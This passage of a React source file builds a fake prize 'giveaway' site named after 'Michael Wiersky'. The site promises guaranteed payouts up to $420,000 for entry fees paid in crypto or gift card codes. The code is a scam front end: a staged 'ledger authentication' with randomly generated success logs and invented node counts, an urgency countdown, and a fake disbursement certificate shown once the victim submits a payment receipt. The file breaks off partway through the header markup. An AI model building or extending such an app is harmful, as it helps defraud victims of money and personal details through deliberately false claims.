import React, { useState, useCallback, useEffect, useRef, useMemo } from 'react';
import { PrizeTier, AppStep, UserDetails, Transaction } from './types';
import { PRIZE_TIERS, PREFERRED_CLAIM_TIERS, APP_NAME, DEFAULT_ADMIN_PASSWORD } from './constants';
import { PrizeCard } from './components/PrizeCard';
import { PreferClaimSection } from './components/PreferClaimSection';
import { ClaimantProfileSection } from './components/ClaimantProfileSection';
import { PaymentSection } from './components/PaymentSection';
import { AdminDashboard } from './components/AdminDashboard';
import { LiveSupportChat } from './components/LiveSupportChat';
import {
  CreditCard,
  Shield,
  ArrowRight,
  CheckCircle,
  FileText,
  Lock,
  Sparkles,
  ChevronRight,
  Layers,
  Upload,
} from 'lucide-react';

interface VerificationViewProps {
  verificationProgress: number;
}

const VerificationView: React.FC<VerificationViewProps> = ({ verificationProgress }) => {
  const subSteps = [
    { label: 'Initializing network sync', limit: 15, details: 'P2P Handshake initiated...' },
    { label: 'Matching mempool & receipt hash', limit: 40, details: 'Validating receipt hash & settlement...' },
    { label: 'Validating cryptographic ledger', limit: 70, details: 'SHA-256 integrity check...' },
    { label: 'Finalizing claim distribution', limit: 100, details: 'Generating multi-tier payout key...' },
  ];

  const logEntries = useMemo(() => {
    const systems = ['AUTH', 'DB', 'LEDGER', 'API', 'SEC', 'NODE', 'SETTLEMENT'];
    const actions = ['FETCH', 'SYNC', 'VALIDATE', 'DECRYPT', 'VERIFY', 'PROOF_ACCEPTED'];
    return Array.from({ length: 15 }).map(() => {
      const sys = systems[Math.floor(Math.random() * systems.length)];
      const act = actions[Math.floor(Math.random() * actions.length)];
      const hash = Math.random().toString(16).slice(2, 8).toUpperCase();
      return `${sys}_${act}: [0x${hash}] - OK`;
    });
  }, []);

  const activeLogIndex = Math.floor((verificationProgress / 100) * logEntries.length);

  return (
    <div className="py-16 px-4 max-w-2xl mx-auto text-center overflow-hidden">
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div
          className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-blue-600/10 rounded-full blur-[120px] transition-all duration-300"
          style={{
            transform: `translate(-50%, -50%) scale(${1 + verificationProgress / 200})`,
            opacity: 0.1 + (verificationProgress / 100) * 0.4,
          }}
        />
      </div>

      <div className="mb-12 relative z-10">
        <div className="w-48 h-48 mx-auto relative flex items-center justify-center">
          <div
            className="absolute inset-[-10px] rounded-full border border-blue-500/20 animate-[spin_8s_linear_infinite]"
            style={{ opacity: verificationProgress / 100 }}
          />
          <div
            className="absolute inset-[-20px] rounded-full border border-blue-500/10 animate-[ping_3s_linear_infinite]"
            style={{ opacity: (verificationProgress > 50 ? (verificationProgress - 50) / 50 : 0) * 0.3 }}
          />

          <svg className="w-full h-full transform -rotate-90">
            <circle cx="96" cy="96" r="88" stroke="currentColor" strokeWidth="4" fill="transparent" className="text-slate-800" />
            <circle
              cx="96"
              cy="96"
              r="88"
              stroke="currentColor"
              strokeWidth="8"
              fill="transparent"
              strokeDasharray={553}
              strokeDashoffset={553 - (553 * verificationProgress) / 100}
              strokeLinecap="round"
              className="text-blue-500 transition-all duration-300 ease-out shadow-[0_0_15px_rgba(59,130,246,0.5)]"
            />
          </svg>
          <div className="absolute inset-0 flex flex-col items-center justify-center">
            <span
              className="text-5xl font-black text-white tracking-tighter transition-all duration-300 transform"
              style={{ scale: 1 + (verificationProgress % 10) / 100 }}
            >
              {verificationProgress}%
            </span>
            <span className="text-[10px] font-bold text-blue-400 uppercase tracking-[0.2em] animate-pulse">
              Authenticating
            </span>
          </div>
        </div>
      </div>

      <div className="relative z-10 mb-10">
        <h2 className="text-3xl font-bold mb-2 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-slate-400">
          Network Ledger & Receipt Authentication
        </h2>
        <div className="flex items-center justify-center gap-3 text-xs font-mono text-slate-500">
          <span className="flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" /> Nodes Active: 142
          </span>
          <span className="w-px h-3 bg-slate-800" />
          <span>Latency: {12 + Math.floor(Math.random() * 20)}ms</span>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 max-w-xl mx-auto text-left relative z-10 mb-8">
        {subSteps.map((item, i) => {
          const isCompleted = verificationProgress >= item.limit;
          const isCurrent = verificationProgress < item.limit && (i === 0 || verificationProgress >= subSteps[i - 1].limit);

          return (
            <div
              key={i}
              className={`group flex items-center gap-3 p-4 rounded-2xl border transition-all duration-500 ${
                isCompleted
                  ? 'bg-green-500/5 border-green-500/20 opacity-100'
                  : isCurrent
                  ? 'bg-blue-500/10 border-blue-500/40 opacity-100 scale-[1.02] shadow-[0_0_30px_rgba(59,130,246,0.15)]'
                  : 'bg-slate-900/40 border-slate-800 opacity-40'
              }`}
            >
              <div
                className={`w-8 h-8 rounded-xl flex items-center justify-center transition-all duration-500 ${
                  isCompleted
                    ? 'bg-green-500 text-white rotate-[360deg]'
                    : isCurrent
                    ? 'bg-blue-600 animate-pulse text-white'
                    : 'bg-slate-800 text-slate-600'
                }`}
              >
                {isCompleted ? (
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={4} d="M5 13l4 4L19 7" />
                  </svg>
                ) : (
                  <span className="text-[10px] font-black">{i + 1}</span>
                )}
              </div>
              <div className="flex-1 min-w-0">
                <p
                  className={`text-xs font-bold truncate transition-colors ${
                    isCompleted ? 'text-green-400' : isCurrent ? 'text-blue-400' : 'text-slate-500'
                  }`}
                >
                  {item.label}
                </p>
                <div className="h-1 w-full bg-slate-800 rounded-full mt-1.5 overflow-hidden">
                  <div
                    className={`h-full transition-all duration-300 ${isCompleted ? 'bg-green-500' : 'bg-blue-500'}`}
                    style={{
                      width: isCompleted
                        ? '100%'
                        : isCurrent
                        ? `${((verificationProgress - (i > 0 ? subSteps[i - 1].limit : 0)) /
                            (item.limit - (i > 0 ? subSteps[i - 1].limit : 0))) *
                          100}%`
                        : '0%',
                    }}
                  />
                </div>
              </div>
            </div>
          );
        })}
      </div>

      <div className="max-w-xl mx-auto relative z-10 bg-slate-950/80 border border-slate-800 rounded-2xl p-5 text-left font-mono text-[10px] shadow-2xl backdrop-blur-md">
        <div className="flex items-center justify-between mb-4 border-b border-slate-800 pb-2">
          <div className="flex items-center gap-2">
            <div className="flex gap-1">
              <div className="w-2 h-2 rounded-full bg-red-500/50" />
              <div className="w-2 h-2 rounded-full bg-yellow-500/50" />
              <div className="w-2 h-2 rounded-full bg-green-500/50" />
            </div>
            <span className="text-slate-500 font-bold uppercase tracking-widest text-[9px]">Live System Logs</span>
          </div>
          <span className="text-blue-500/50 text-[9px] animate-pulse">NODE_07 ACTIVE</span>
        </div>

        <div className="space-y-1.5 h-32 overflow-hidden relative">
          {logEntries
            .slice(0, activeLogIndex + 1)
            .map((log, idx) => (
              <p key={idx} className="text-slate-400 animate-[fadeIn_0.3s_ease-out] flex justify-between">
                <span className="text-blue-400/80 mr-2">
                  [{new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })}]
                </span>
                <span className="flex-1">{log}</span>
                <span className="text-green-500/50 ml-2">✓</span>
              </p>
            ))
            .reverse()}
          <div className="absolute bottom-0 left-0 right-0 h-12 bg-gradient-to-t from-slate-950/90 to-transparent pointer-events-none" />
        </div>
      </div>
    </div>
  );
};

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>(AppStep.LANDING);
  const [selectedTier, setSelectedTier] = useState<PrizeTier | null>(null);
  const [hasAlreadyWon, setHasAlreadyWon] = useState(false);
  const [verificationProgress, setVerificationProgress] = useState(0);
  const [timeLeft, setTimeLeft] = useState({ hours: 2, minutes: 45, seconds: 0 });
  const [selectionCategory, setSelectionCategory] = useState<'ALL' | 'ENTRY' | 'VIP'>('ALL');
  const [userDetails, setUserDetails] = useState<UserDetails>({
    fullName: '',
    email: '',
    paymentMethod: 'BTC',
    walletAddress: '',
  });

  const audioCtxRef = useRef<AudioContext | null>(null);

  const navigateToStep = useCallback((newStep: AppStep) => {
    setStep(newStep);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  const playSound = (type: 'select' | 'nav' | 'success' | 'tick' | 'fanfare') => {
    try {
      if (!audioCtxRef.current) {
        audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      }
      const ctx = audioCtxRef.current;
      if (ctx.state === 'suspended') ctx.resume();

      const now = ctx.currentTime;

      switch (type) {
        case 'select': {
          const selOsc = ctx.createOscillator();
          const selGain = ctx.createGain();
          selOsc.connect(selGain);
          selGain.connect(ctx.destination);
          selOsc.type = 'sine';
          selOsc.frequency.setValueAtTime(440, now);
          selGain.gain.setValueAtTime(0.05, now);
          selGain.gain.exponentialRampToValueAtTime(0.001, now + 0.1);
          selOsc.start(now);
          selOsc.stop(now + 0.1);
          break;
        }
        case 'nav': {
          const navOsc = ctx.createOscillator();
          const navGain = ctx.createGain();
          navOsc.connect(navGain);
          navGain.connect(ctx.destination);
          navOsc.type = 'sine';
          navOsc.frequency.setValueAtTime(523.25, now);
          navOsc.frequency.exponentialRampToValueAtTime(659.25, now + 0.1);
          navGain.gain.setValueAtTime(0.03, now);
          navGain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
          navOsc.start(now);
          navOsc.stop(now + 0.2);
          break;
        }
        case 'tick': {
          const tickOsc = ctx.createOscillator();
          const tickGain = ctx.createGain();
          tickOsc.connect(tickGain);
          tickGain.connect(ctx.destination);
          tickOsc.type = 'square';
          tickOsc.frequency.setValueAtTime(150, now);
          tickGain.gain.setValueAtTime(0.01, now);
          tickGain.gain.exponentialRampToValueAtTime(0.0001, now + 0.05);
          tickOsc.start(now);
          tickOsc.stop(now + 0.05);
          break;
        }
        case 'success':
        case 'fanfare': {
          const chord = [523.25, 659.25, 783.99, 1046.5];
          chord.forEach((freq, i) => {
            const o = ctx.createOscillator();
            const g = ctx.createGain();
            o.type = 'sine';
            o.frequency.setValueAtTime(freq, now + i * 0.08);
            g.connect(ctx.destination);
            o.connect(g);
            g.gain.setValueAtTime(0.04, now + i * 0.08);
            g.gain.exponentialRampToValueAtTime(0.001, now + i * 0.08 + 0.6);
            o.start(now + i * 0.08);
            o.stop(now + i * 0.08 + 0.7);
          });
          break;
        }
      }
    } catch (e) {
      console.warn('Audio feedback skipped', e);
    }
  };

  const steps = [
    { key: AppStep.LANDING, label: 'Start' },
    { key: AppStep.SELECTION, label: 'Choose' },
    { key: AppStep.DETAILS, label: 'Entry' },
    { key: AppStep.PAYMENT, label: 'Payment' },
    { key: AppStep.VERIFICATION, label: 'Verify' },
    { key: AppStep.CONFIRMATION, label: 'Finish' },
  ];

  const currentStepIndex = steps.findIndex((s) => s.key === step);

  useEffect(() => {
    if (step === AppStep.CONFIRMATION) {
      playSound('fanfare');
      const triggerConfetti = async () => {
        try {
          const { default: confetti } = await import('https://esm.sh/canvas-confetti@1.9.3');
          confetti({
            particleCount: 150,
            spread: 70,
            origin: { y: 0.6 },
            colors: ['#2563eb', '#60a5fa', '#ffffff', '#fbbf24'],
          });
        } catch (e) {
          console.error('Confetti failed to load', e);
        }
      };
      triggerConfetti();
    }
  }, [step]);

  useEffect(() => {
    const winnerStatus = localStorage.getItem('mw_giveaway_winner');
    if (winnerStatus === 'true') {
      setHasAlreadyWon(true);
      const storedTier = localStorage.getItem('mw_selected_tier');
      if (storedTier) {
        try {
          setSelectedTier(JSON.parse(storedTier));
        } catch (e) {}
      }
    }
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev.hours === 0 && prev.minutes === 0 && prev.seconds === 0) {
          clearInterval(timer);
          return prev;
        }
        let s = prev.seconds - 1;
        let m = prev.minutes;
        let h = prev.hours;
        if (s < 0) {
          s = 59;
          m -= 1;
        }
        if (m < 0) {
          m = 59;
          h -= 1;
        }
        return { hours: h, minutes: m, seconds: s };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleStart = () => {
    playSound('nav');
    if (hasAlreadyWon) navigateToStep(AppStep.CONFIRMATION);
    else navigateToStep(AppStep.SELECTION);
  };

  const handleTierSelect = (tier: PrizeTier) => {
    playSound('select');
    setSelectedTier(tier);
  };

  const handlePreferClaimSelect = (tier: PrizeTier, autoProceed: boolean = false) => {
    playSound('select');
    setSelectedTier(tier);
    if (autoProceed) {
      playSound('nav');
      navigateToStep(AppStep.DETAILS);
    } else {
      playSound('nav');
      navigateToStep(AppStep.SELECTION);
    }
  };

  const handleNextStep = () => {
    if (step === AppStep.SELECTION && selectedTier) {
      playSound('nav');
      navigateToStep(AppStep.DETAILS);
    }
  };

  const handleDetailsSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    playSound('nav');
    navigateToStep(AppStep.PAYMENT);
  };

  const handleReceiptSubmitted = (tx: Transaction) => {
    playSound('success');
    setUserDetails((prev) => ({
      ...prev,
      paymentMethod: tx.paymentMethod,
      walletAddress: tx.walletAddress,
      fullName: tx.claimantName || prev.fullName,
      email: tx.email || prev.email,
    }));
    setTimeout(() => {
      navigateToStep(AppStep.VERIFICATION);
    }, 900);
  };

  useEffect(() => {
    if (step === AppStep.VERIFICATION) {
      const interval = setInterval(() => {
        setVerificationProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              setHasAlreadyWon(true);
              localStorage.setItem('mw_giveaway_winner', 'true');
              if (selectedTier) {
                localStorage.setItem('mw_selected_tier', JSON.stringify(selectedTier));
              }
              navigateToStep(AppStep.CONFIRMATION);
            }, 1200);
            return 100;
          }
          const jump = Math.random() > 0.8 ? 3 : 1;
          playSound('tick');
          return prev + jump;
        });
      }, 80);
      return () => clearInterval(interval);
    }
  }, [step, navigateToStep, selectedTier]);

  const renderProgressBar = () => {
    if (step === AppStep.ADMIN) return null;
    return (
      <div className="max-w-2xl mx-auto px-4 mt-6 mb-2">
        <div className="relative flex justify-between items-center">
          <div className="absolute top-1/2 left-0 w-full h-0.5 bg-slate-800 -translate-y-1/2 z-0" />
          <div
            className="absolute top-1/2 left-0 h-0.5 bg-blue-500 -translate-y-1/2 z-0 transition-all duration-500"
            style={{ width: `${(currentStepIndex / (steps.length - 1)) * 100}%` }}
          />
          {steps.map((s, idx) => (
            <div key={s.key} className="relative z-10 flex flex-col items-center gap-1.5">
              <div
                onClick={() => {
                  if (idx < currentStepIndex) {
                    playSound('nav');
                    navigateToStep(s.key);
                  }
                }}
                className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-300 border-2 ${
                  idx <= currentStepIndex
                    ? 'bg-blue-600 border-blue-400 text-white shadow-[0_0_10px_rgba(37,99,235,0.4)] cursor-pointer'
                    : 'bg-slate-900 border-slate-700 text-slate-500'
                }`}
              >
                {idx < currentStepIndex ? (
                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                ) : (
                  idx + 1
                )}
              </div>
              <span className="text-[10px] font-bold text-slate-400 hidden sm:block">{s.label}</span>
            </div>
          ))}
        </div>
      </div>
    );
  };

  const renderLanding = () => (
    <div className="flex flex-col items-center justify-center text-center py-10 px-4">
      {/* Top Countdown */}
      <div className="mb-8 bg-slate-800/40 border border-blue-500/30 rounded-3xl p-5 md:p-7 backdrop-blur-sm shadow-2xl shadow-blue-500/10 max-w-xl w-full">
        <p className="text-blue-400 font-bold uppercase tracking-widest text-xs mb-3">Live Multiplier Cycle Closes In</p>
        <div className="flex gap-4 md:gap-8 justify-center items-center">
          <div className="flex flex-col">
            <span className="text-4xl md:text-5xl font-black text-white">{String(timeLeft.hours).padStart(2, '0')}</span>
            <span className="text-[10px] text-slate-500 font-bold uppercase">Hours</span>
          </div>
          <span className="text-3xl font-bold text-slate-600 mb-3">:</span>
          <div className="flex flex-col">
            <span className="text-4xl md:text-5xl font-black text-white">{String(timeLeft.minutes).padStart(2, '0')}</span>
            <span className="text-[10px] text-slate-500 font-bold uppercase">Minutes</span>
          </div>
          <span className="text-3xl font-bold text-slate-600 mb-3">:</span>
          <div className="flex flex-col">
            <span className="text-4xl md:text-5xl font-black text-blue-500">{String(timeLeft.seconds).padStart(2, '0')}</span>
            <span className="text-[10px] text-slate-500 font-bold uppercase">Seconds</span>
          </div>
        </div>
      </div>

      <h1 className="text-4xl sm:text-6xl md:text-7xl font-extrabold mb-5 bg-clip-text text-transparent bg-gradient-to-r from-blue-400 via-indigo-300 to-indigo-500 tracking-tight">
        {APP_NAME}
      </h1>
      <p className="text-base sm:text-lg text-slate-400 max-w-3xl mb-8 leading-relaxed">
        {hasAlreadyWon
          ? 'You have already participated in this giveaway cycle. Please inspect your verified disbursement certificate.'
          : 'The official wealth distribution and prefer claim program. Lock in verified ticket multipliers from $5,000.00 up to $420,000.00 guaranteed payouts.'}
      </p>

      <div className="flex flex-wrap items-center justify-center gap-4 mb-14">
        <button
          onClick={handleStart}
          className="px-8 sm:px-10 py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-full text-base sm:text-lg font-black transition-all transform hover:scale-105 shadow-xl shadow-blue-500/25 flex items-center gap-2"
        >
          <span>{hasAlreadyWon ? 'View Claim Status' : 'Choose Your Prize Ticket'}</span>
          <ArrowRight className="w-5 h-5" />
        </button>

        <button
          onClick={() => {
            playSound('nav');
            navigateToStep(AppStep.SELECTION);
          }}
          className="px-8 py-4 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-full text-base font-bold transition-all border border-slate-700 flex items-center gap-2"
        >
          <Sparkles className="w-4 h-4 text-amber-400" />
          <span>Explore 13 Prefer Claim Tiers</span>
        </button>
      </div>

      {/* Embed Prefer Claim Schedule */}
      <PreferClaimSection onSelectTier={handlePreferClaimSelect} selectedTierId={selectedTier?.id} />
    </div>
  );

  const displayedTiers = PREFERRED_CLAIM_TIERS.filter((tier) => {
    if (selectionCategory === 'ENTRY') return tier.entryFee <= 500;
    if (selectionCategory === 'VIP') return tier.entryFee > 500;
    return true;
  });

  const renderSelection = () => (
    <div className="py-10 px-4 max-w-7xl mx-auto">
      <div className="text-center mb-8">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/30 text-blue-400 text-xs font-black uppercase tracking-widest mb-3">
          13 Guaranteed Prefer Claim Options
        </div>
        <h2 className="text-3xl md:text-5xl font-black mb-2 text-white">Select Your Prefer Claim Ticket</h2>
        <p className="text-slate-400 max-w-2xl mx-auto text-sm sm:text-base">
          Choose any ticket entry below to unlock guaranteed payouts from $5,000.00 to $420,000.00.
        </p>
      </div>

      {/* Filter Tabs */}
      <div className="flex justify-center items-center gap-2 mb-8">
        <button
          onClick={() => setSelectionCategory('ALL')}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            selectionCategory === 'ALL'
              ? 'bg-blue-600 text-white shadow-lg shadow-blue-500/25'
              : 'bg-slate-800 text-slate-400 hover:text-white'
          }`}
        >
          All Tiers (13)
        </button>
        <button
          onClick={() => setSelectionCategory('ENTRY')}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            selectionCategory === 'ENTRY'
              ? 'bg-blue-600 text-white shadow-lg shadow-blue-500/25'
              : 'bg-slate-800 text-slate-400 hover:text-white'
          }`}
        >
          Starter & Mid ($50 - $500)
        </button>
        <button
          onClick={() => setSelectionCategory('VIP')}
          className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            selectionCategory === 'VIP'
              ? 'bg-blue-600 text-white shadow-lg shadow-blue-500/25'
              : 'bg-slate-800 text-slate-400 hover:text-white'
          }`}
        >
          High Roller ($1,000 - $10,000)
        </button>
      </div>

      {/* Grid of Prize Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
        {displayedTiers.map((tier) => (
          <PrizeCard key={tier.id} tier={tier} isSelected={selectedTier?.id === tier.id} onSelect={handleTierSelect} />
        ))}
      </div>

      {/* Bottom Sticky Action Bar */}
      <div className="fixed bottom-0 left-0 right-0 p-4 sm:p-5 bg-slate-950/90 backdrop-blur-xl border-t border-slate-800 z-30 flex items-center justify-between max-w-7xl mx-auto sm:rounded-t-2xl shadow-2xl">
        <div className="hidden sm:flex flex-col text-left">
          <p className="text-xs text-slate-400 font-bold uppercase tracking-wider">
            {selectedTier ? `Selected: $${selectedTier.entryFee.toLocaleString()} Ticket` : 'No Ticket Selected'}
          </p>
          <p className="text-lg font-black text-white">
            {selectedTier
              ? `Guaranteed Payout: $${selectedTier.reward.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
              : 'Choose a ticket above'}
          </p>
        </div>

        <button
          disabled={!selectedTier}
          onClick={handleNextStep}
          className={`w-full sm:w-auto px-10 py-3.5 rounded-xl font-bold text-base transition-all ${
            selectedTier
              ? 'bg-blue-600 hover:bg-blue-500 text-white shadow-lg shadow-blue-500/30 active:scale-95'
              : 'bg-slate-800 text-slate-500 cursor-not-allowed'
          }`}
        >
          {selectedTier
            ? `Proceed with $${selectedTier.reward.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} Reward`
            : 'Select a Prefer Ticket'}
        </button>
      </div>
      <div className="h-28" />
    </div>
  );

  const renderDetails = () => (
    <ClaimantProfileSection
      selectedTier={selectedTier}
      userDetails={userDetails}
      onUpdateUserDetails={(updated) => setUserDetails((prev) => ({ ...prev, ...updated }))}
      onSubmit={handleDetailsSubmit}
      onBack={() => {
        playSound('nav');
        navigateToStep(AppStep.SELECTION);
      }}
    />
  );

  const renderPayment = () => (
    <div className="py-6">
      <div className="max-w-3xl mx-auto px-4 mb-4 text-center">
        <button
          onClick={() => {
            playSound('nav');
            navigateToStep(AppStep.DETAILS);
          }}
          className="text-blue-400 hover:text-blue-300 flex items-center gap-2 mb-2 mx-auto font-bold text-sm"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
          Back to Claimant Entry
        </button>
      </div>

      <PaymentSection
        selectedTier={selectedTier || PREFERRED_CLAIM_TIERS[0]}
        onReceiptSubmitted={handleReceiptSubmitted}
        defaultFullName={userDetails.fullName}
        defaultEmail={userDetails.email}
        defaultPayoutAddress={userDetails.walletAddress}
        defaultPaymentMethod={userDetails.paymentMethod}
        defaultGiftCardCode={userDetails.giftCardCode}
        defaultReceiptFile={userDetails.receiptFile}
        defaultReceiptFileName={userDetails.receiptFileName}
        showStandAloneHeader={true}
      />
    </div>
  );

  const renderConfirmation = () => {
    const multiplier = selectedTier ? Math.round((selectedTier.reward / selectedTier.entryFee) * 10) / 10 : 100;
    const rewardFormatted = selectedTier
      ? selectedTier.reward.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
      : '5,000.00';

    return (
      <div className="py-14 px-4 max-w-2xl mx-auto text-center relative z-10">
        <div className="mb-6 inline-flex items-center justify-center w-20 h-20 bg-green-500/20 text-green-500 rounded-full animate-[bounce_2s_infinite]">
          <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h2 className="text-3xl sm:text-5xl font-black mb-3 bg-clip-text text-transparent bg-gradient-to-r from-green-400 to-emerald-500">
          You've Won, {userDetails.fullName.split(' ')[0] || 'Winner'}!
        </h2>
        <p className="text-base sm:text-lg text-slate-400 mb-8 leading-relaxed">
          Michael Wiersky is proud to confirm your official win! Your claim for the{' '}
          <span className="text-white font-bold tracking-tight">${rewardFormatted} guaranteed payout</span> (
          {selectedTier?.entryFee ? `$${selectedTier.entryFee} ticket` : 'prefer claim'}) has been authenticated and queued
          for disbursement.
        </p>

        {/* Celebratory Stats */}
        <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-8">
          <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
            <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Total Winnings</p>
            <p className="text-xl sm:text-2xl font-black text-white">${rewardFormatted}</p>
          </div>
          <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
            <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Win Multiplier</p>
            <p className="text-xl sm:text-2xl font-black text-blue-400">{multiplier}x Return</p>
          </div>
          <div className="hidden md:block bg-slate-900/60 border border-slate-800 rounded-2xl p-4">
            <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Verify Date</p>
            <p className="text-xl sm:text-2xl font-black text-slate-300">{new Date().toLocaleDateString()}</p>
          </div>
        </div>

        {/* Certificate */}
        <div className="bg-slate-800/50 p-6 sm:p-8 rounded-3xl border border-slate-700 text-left mb-8 shadow-2xl shadow-green-500/5 relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
            <svg className="w-24 h-24" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" />
            </svg>
          </div>

          <h3 className="text-base font-bold mb-5 text-blue-400 flex items-center gap-2">
            <CheckCircle className="w-5 h-5 text-emerald-400" />
            Official Prefer Claim Disbursement Certificate
          </h3>

          <div className="grid grid-cols-2 gap-y-5 gap-x-4 text-xs sm:text-sm relative z-10">
            <div>
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Claim Status</p>
              <p className="text-green-500 font-black uppercase tracking-wider flex items-center gap-1.5">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" /> Disbursement Active
              </p>
            </div>
            <div>
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Guaranteed Reward Value</p>
              <p className="text-white font-black text-sm sm:text-base">${rewardFormatted}</p>
            </div>
            <div>
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Prefer Ticket Fee</p>
              <p className="text-white font-bold">${selectedTier?.entryFee.toLocaleString() || '50'}</p>
            </div>
            <div>
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Payout Method</p>
              <p className="text-white font-bold">{userDetails.paymentMethod || 'Secure Ledger'}</p>
            </div>
            <div className="col-span-2">
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">
                Recipient Payout Address
              </p>
              <p className="text-white font-mono break-all opacity-90 bg-slate-900/80 p-2 rounded-lg border border-slate-700/50">
                {userDetails.walletAddress || 'Network-Encrypted-HID-772'}
              </p>
            </div>
          </div>

          <div className="mt-6 pt-5 border-t border-slate-700/50">
            <div className="flex gap-3 items-start">
              <div className="p-2 bg-blue-500/10 rounded-lg text-blue-400 shrink-0">
                <FileText className="w-4 h-4" />
              </div>
              <div>
                <p className="text-xs font-bold text-slate-300 mb-1">Settlement Pipeline</p>
                <p className="text-[11px] text-slate-500 leading-relaxed">
                  Your payment receipt has been matched on the ledger. Disbursements are synchronized through the Michael
                  Wiersky Global Disbursement Node.
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
          <button
            onClick={() => {
              playSound('nav');
              navigateToStep(AppStep.LANDING);
            }}
            className="w-full sm:w-auto px-8 py-3 bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white rounded-xl font-bold transition-all border border-slate-700"
          >
            Return to Dashboard
          </button>
          <button
            onClick={() => window.print()}
            className="w-full sm:w-auto px-8 py-3 bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 rounded-xl font-bold transition-all border border-blue-500/20"
          >
            Print Receipt
          </button>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen pb-20 relative overflow-x-hidden bg-slate-950 text-slate-100 flex flex-col justify-between">
      <div>
        {/* Header */}
        <header className="sticky top-0 z-50 bg-slate-950/80 backdrop-blur-lg border-b border-slate-800">
          <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
            <div
              className="flex items-center gap-2.5 cursor-pointer"
              onClick={() => {
                playSound('nav');
                navigateToStep(AppStep.LANDING);
              }}
            >
              <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center font-black text-white italic shadow-md shadow-blue-500/30">
                M
              </div>
              <span className="font-extrabold text-lg tracking-tight text-white">{APP_NAME}</span>
            </div>

            {/* Navigation Actions */}
            <div className="flex items-center gap-3">
              <button
                onClick={() => {
                  playSound('nav');
                  navigateToStep(AppStep.PAYMENT);
                }}
                className={`hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                  step === AppStep.PAYMENT
                    ? 'bg-blue-600 text-white'
                    : 'bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800'
                }`}
              >
                <CreditCard className="w-3.5 h-3.5 text-blue-400" />
                <span>Payment & Receipts</span>
              </button>

              <button
                onClick={() => {
                  playSound('nav');
                  navigateToStep(AppStep.ADMIN);
                }}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold transition-all ${
                  step === AppStep.ADMIN
                    ? 'bg-purple-600 text-white'
                    : 'bg-slate-900 hover:bg-slate-800 text-slate-400 hover:text-white border border-slate-800'
                }`}
                title="Admin Authentication & Receipts Portal"
              >
                <Lock className="w-3.5 h-3.5 text-purple-400" />
                <span>Admin</span>
              </button>

